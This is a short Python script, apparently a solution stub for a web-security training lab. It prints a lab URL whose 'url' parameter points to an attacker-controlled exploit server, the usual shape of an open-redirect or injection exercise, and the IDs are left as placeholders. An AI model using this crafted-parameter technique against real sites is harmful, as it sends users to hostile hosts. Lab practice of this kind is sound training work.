import http.client
import random
import ssl
import string
import urllib
import urllib.parse

LAB_ID = "???"
EXPLOIT_SERVER_ID = "???"

print("visit url:")
print(f"https://{LAB_ID}.web-security-academy.net/post?postId=3&url=https://exploit-{EXPLOIT_SERVER_ID}.exploit-server.net")
